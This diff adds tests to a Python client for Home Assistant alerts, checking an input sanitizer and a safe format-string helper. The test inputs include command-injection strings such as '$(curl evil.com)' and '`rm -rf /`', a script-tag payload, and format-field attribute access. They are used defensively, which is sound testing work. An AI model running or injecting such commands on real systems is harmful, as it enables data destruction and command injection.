@@ -1,4 +1,4 @@
-"""Tests for robustness improvements: dedup bounds, dismiss tracking, client lifecycle."""
+"""Tests for robustness and security: sanitization, safe formatter, dedup, client lifecycle."""
 from __future__ import annotations
 
 import time
@@ -166,3 +166,68 @@ async def test_start_repeat_cancels_existing():
     # Let the event loop process the cancellation.
     await asyncio.sleep(0)
     assert first_task.cancelled()
+
+
+# ── Input sanitization ───────────────────────────────────────────────────────
+
+def test_sanitizer_strips_shell_metacharacters():
+    from src.ha_client import _sanitize
+    assert _sanitize("hello") == "hello"
+    assert _sanitize("$(whoami)") == "whoami"
+    assert _sanitize("`rm -rf /`") == "rm -rf /"  # backticks stripped, / kept
+    assert _sanitize("foo; bar") == "foo bar"
+    assert _sanitize("a|b&c") == "abc"
+    assert _sanitize("test<script>alert(1)</script>") == "testscriptalert1/script"
+
+
+def test_sanitizer_strips_control_characters():
+    from src.ha_client import _sanitize
+    assert _sanitize("line1\x00line2") == "line1line2"
+    assert _sanitize("null\x01byte") == "nullbyte"
+
+
+def test_sanitizer_preserves_normal_text():
+    from src.ha_client import _sanitize
+    text = "Priority 1, Critical alert: CPU usage at 95% on prod-server-01!"
+    assert _sanitize(text) == text
+
+
+def test_format_vars_sanitizes_alert_fields():
+    """Alert fields with shell metacharacters should be stripped."""
+    client = HAClient(
+        ha_url="https://ha.example.com",
+        ha_token="token",
+        media_player="media_player.test",
+        tts_service="tts.test",
+        tts_language="en-US",
+        tts_voice="TestVoice",
+    )
+    alert = make_alert(
+        message="$(curl evil.com)",
+        entity="`rm -rf /`",
+        description="normal description",
+    ).alert
+    variables = client._format_vars(alert, "Create")
+    assert "$" not in variables["message"]
+    assert "`" not in variables["entity"]
+    assert "curl evil.com" in variables["message"]
+
+
+# ── Safe formatter ───────────────────────────────────────────────────────────
+
+def test_safe_formatter_allows_simple_placeholders():
+    from src.ha_client import _safe_fmt
+    result = _safe_fmt.format("{greeting} {name}!", greeting="Hello", name="World")
+    assert result == "Hello World!"
+
+
+def test_safe_formatter_blocks_attribute_access():
+    from src.ha_client import _safe_fmt
+    with pytest.raises(ValueError, match="Unsafe format field"):
+        _safe_fmt.format("{obj.__class__}", obj="test")
+
+
+def test_safe_formatter_blocks_index_access():
+    from src.ha_client import _safe_fmt
+    with pytest.raises(ValueError, match="Unsafe format field"):
+        _safe_fmt.format("{obj[0]}", obj=["a", "b"])
